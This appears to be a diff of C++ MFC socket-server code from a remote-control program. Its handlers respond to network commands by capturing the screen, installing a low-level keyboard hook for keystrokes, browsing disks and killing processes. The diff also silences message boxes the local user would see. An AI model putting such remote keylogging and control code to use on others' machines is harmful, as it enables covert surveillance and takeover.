@@ -222,40 +222,19 @@ BOOL CReceivingSocket::OnReceiveCapScreen(int nErrorCode)
 
 PreReturnCleanup: // labelled goto destination
 
-    // free allocated memory
-    // if we got here from a goto that skipped allocation,
-    // delete of NULL pointer
-    // is permissible under C++ standard and is harmless
     delete[] sendData;
 
     if (bFileIsOpen)
         sourceFile.Close();
-    // only close file if it's open (open might have failed above)
-
-    //this->Close();
 
     return bRet;
 
 }
 
-void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
-{
+void CReceivingSocket::OnReceiveKeystroke(int nErrorCode){
     if (m_hook == NULL && m_strMsg == "REQ_KSTR_HOOK")
-    {
-        // Install a hook to detect keystrokes
         m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-
-        // Wait for keystrokes to be detected
-        MSG msg;
-        while (GetMessage(&msg, NULL, 0, 0))
-        {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-        }
-    }
-    else if (m_hook != NULL && m_strMsg == "REQ_KSTR_UNHOOK")
-    {
-        // Uninstall the hook
+    else if (m_hook != NULL && m_strMsg == "REQ_KSTR_UNHOOK")    {
         UnhookWindowsHookEx(m_hook);
         m_hook = NULL;
     }
@@ -284,6 +263,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+// FOR BROWSE DIRECTORY
 BOOL CReceivingSocket::OnReceiveBrowseDisk(int nErrorCode)
 {
     std::vector<CStringW> diskList;
@@ -345,10 +325,10 @@ void CReceivingSocket::OnReceiveBrowseDir(int nErrorCode, CStringW path)
     {
         CString msg = "Invalid path!";
         this->Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
-        AfxMessageBox(msg);
     }
 }
 
+// FOR SHOW PROCESSES
 void  CReceivingSocket::OnReceiveShowPro_Kill(int nErrorCode, int Pid) {
     CString msg;
     if (killProcess(Pid)) {
@@ -416,7 +396,7 @@ void CReceivingSocket::OnReceiveShowApp(int ErrorCode) {
 void CReceivingSocket::OnReceiveShowApp_Kill(int nErrorCode, std::string appName) {
     CString msg;
     CString tmp(appName.c_str());
-    MessageBox(NULL, tmp, "ALOALO", MB_OK | MB_ICONINFORMATION);
+    // MessageBox(NULL, tmp, "ALOALO", MB_OK | MB_ICONINFORMATION);
     if (TerminateApplication(appName)) {
         msg = "Successed!";
     }
